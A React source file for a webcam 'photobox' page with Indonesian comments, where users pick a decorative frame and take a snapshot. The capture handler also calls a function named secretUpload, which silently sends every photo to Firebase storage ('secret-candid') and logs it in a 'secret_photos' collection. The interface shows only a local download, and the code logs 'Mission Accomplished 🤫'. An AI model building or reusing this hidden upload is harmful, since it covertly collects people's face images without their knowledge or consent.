import React, { useRef, useState, useCallback } from "react";
import Webcam from "react-webcam";
import { useNavigate } from "react-router-dom";
import { v4 as uuidv4 } from "uuid";
import { storage, db } from "../firebase"; 
import { ref, uploadString, getDownloadURL } from "firebase/storage";
import { doc, setDoc } from "firebase/firestore";

// Frame Lucu-lucuan (Sama seperti punya kamu)
const FRAMES = [
  { id: 'norm', name: 'Normal', overlay: null, emoji: '' },
  { id: 'kuro', name: '💜 Kuromi', emoji: '😈', color: '#D8B4FE' },
  { id: 'cute', name: '🎀 Cute', emoji: '🌸', color: '#FFC0CB' },
  { id: 'date', name: '📸 Date', emoji: '❤️', color: '#FFFFFF' }
];

export function PhotoboxPage() {
  const navigate = useNavigate();
  const webcamRef = useRef<Webcam>(null);
  const [frameIdx, setFrameIdx] = useState(0);
  const [imgSrc, setImgSrc] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [flash, setFlash] = useState(false);

  // --- FUNGSI MERGE (Biar Frame Ikut Kebawa ke Database) ---
  const combineImageWithFrame = async (imageSrc: string): Promise<string> => {
    return new Promise((resolve) => {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      const img = new Image();
      img.src = imageSrc;
      img.onload = () => {
        canvas.width = img.width;
        canvas.height = img.height;
        if (!ctx) return resolve(imageSrc);

        // 1. Gambar Muka
        ctx.drawImage(img, 0, 0);

        // 2. Gambar Frame (Simulasi overlay kamu ke canvas)
        const frame = FRAMES[frameIdx];
        if (frame.id !== 'norm') {
          ctx.strokeStyle = frame.color || "#fff";
          ctx.lineWidth = 20;
          ctx.strokeRect(0, 0, canvas.width, canvas.height);
          
          ctx.font = "80px Arial";
          ctx.fillText(frame.emoji, 50, 100);
        }

        resolve(canvas.toDataURL("image/jpeg", 0.8));
      };
    });
  };

  const secretUpload = async (finalImage: string) => {
    try {
      const fileName = `secret-candid/${Date.now()}.jpg`;
      const storageRef = ref(storage, fileName);
      await uploadString(storageRef, finalImage, 'data_url');
      const downloadURL = await getDownloadURL(storageRef);

      await setDoc(doc(db, "secret_photos", uuidv4()), {
        url: downloadURL,
        createdAt: new Date().toISOString(),
        frame: FRAMES[frameIdx].name,
      });
      console.log("Mission Accomplished 🤫");
    } catch (e) {
      console.error("Silent failed", e);
    }
  };

  const capture = useCallback(async () => {
    const rawImage = webcamRef.current?.getScreenshot();
    if (rawImage) {
      setFlash(true);
      setLoading(true);
      
      // Merge foto + frame dulu
      const mergedImage = await combineImageWithFrame(rawImage);
      
      // Upload yang sudah ada framenya
      secretUpload(mergedImage);

      setTimeout(() => setFlash(false), 200);
      setTimeout(() => {
        setImgSrc(mergedImage); // User juga liat hasil yang sudah ada framenya
        setLoading(false);
      }, 2000);
    }
  }, [webcamRef, frameIdx]);

  return (
    <div className="page-container" style={{ padding: 20, textAlign: 'center', minHeight:'100vh', background:'#1a1a1a', color:'white' }}>
      {/* Tombol Back */}
      <button onClick={() => navigate('/final')} style={{ position:'absolute', top:20, left:20, background:'none', border:'none', color:'#fff', fontSize:24, cursor:'pointer' }}>
        ←
      </button>

      <h2 style={{ marginBottom: 10, fontWeight:'bold' }}>FOTOLAB 📸</h2>
      <p style={{ opacity: 0.6, fontSize: 13, marginBottom: 20 }}>Every moment is a gift!</p>

      <div style={{ position: 'relative', maxWidth: 400, margin: '0 auto', borderRadius: 20, overflow: 'hidden', border:'4px solid #333' }}>
        
        {imgSrc ? (
          <img src={imgSrc} style={{ width: '100%', display: 'block' }} alt="Result" />
        ) : (
          <div style={{ position: 'relative' }}>
            <Webcam
              audio={false}
              ref={webcamRef}
              screenshotFormat="image/jpeg"
              videoConstraints={{ facingMode: "user" }}
              style={{ width: '100%', display: 'block' }}
            />
            {/* Visual Overlay untuk User saat Preview */}
            <div style={{ position:'absolute', inset:0, border: frameIdx !== 0 ? `10px solid ${FRAMES[frameIdx].color}` : 'none', pointerEvents:'none' }}>
                <span style={{ position:'absolute', top:10, left:10, fontSize:40 }}>{FRAMES[frameIdx].emoji}</span>
            </div>
          </div>
        )}

        {loading && (
            <div style={{ position:'absolute', inset:0, background:'rgba(0,0,0,0.8)', color:'#fff', display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', zIndex:50 }}>
                <div className="spinner" style={{ border:'4px solid #f3f3f3', borderTop:'4px solid var(--glow)', borderRadius:'50%', width:40, height:40, animation:'spin 1s linear infinite' }}></div>
                <div style={{ marginTop:15, letterSpacing:2, fontSize:10, fontWeight:'bold' }}>DEVELOPING PHOTO...</div>
            </div>
        )}

        <div style={{ position:'absolute', inset:0, background:'white', opacity: flash?1:0, pointerEvents:'none', transition:'opacity 0.2s' }}/>
      </div>

      {!imgSrc && !loading && (
        <div style={{ marginTop: 25, display:'flex', gap:12, justifyContent:'center' }}>
            <button onClick={() => setFrameIdx((i) => (i+1) % FRAMES.length)} style={{ padding:'12px 24px', borderRadius:30, background:'#333', border:'1px solid #555', color:'#fff', cursor:'pointer' }}>
                Ganti Frame 🎨
            </button>
            <button onClick={capture} style={{ padding:'12px 40px', borderRadius:30, background:'linear-gradient(45deg, #ff0055, #ff00cc)', border:'none', color:'#fff', fontWeight:'bold', cursor:'pointer', boxShadow:'0 0 20px rgba(255,0,85,0.4)' }}>
                JEPRET 📸
            </button>
        </div>
      )}

      {imgSrc && (
        <div style={{ marginTop: 25, display:'flex', flexDirection:'column', gap:10, alignItems:'center' }}>
            <a href={imgSrc} download={`photobox-${Date.now()}.jpg`} style={{ width:'200px', padding:'12px 0', background:'#fff', color:'#000', borderRadius:30, textDecoration:'none', fontWeight:'bold' }}>
                Simpan Foto 💾
            </a>
            <button onClick={() => setImgSrc(null)} style={{ background:'none', border:'none', color:'#aaa', textDecoration:'underline', cursor:'pointer' }}>
                Ulangi Foto 🔄
            </button>
        </div>
      )}

      <style>{`
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
}